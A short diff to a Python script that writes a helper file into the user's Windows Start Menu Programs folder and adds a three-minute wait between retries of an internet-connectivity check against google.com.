@@ -16,14 +16,15 @@ def changedir():
    User_Name = GetUser()
    os.chdir('C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs'.format(User_Name))
    fh = open('pythonautomation.py','w')
-   fh.write('''import os,psutil,urllib
+   fh.write('''import os,psutil,urllib,time
 from urllib.request import urlopen
 #Funtion to check active internet
 def is_internet():
     try:
        urlopen('https://google.com',timeout=1)
        return True
-    except urllib.error.URLError as Error:      
+    except urllib.error.URLError as Error:   
+       time.sleep(180)
        is_internet()
 is_internet()
 
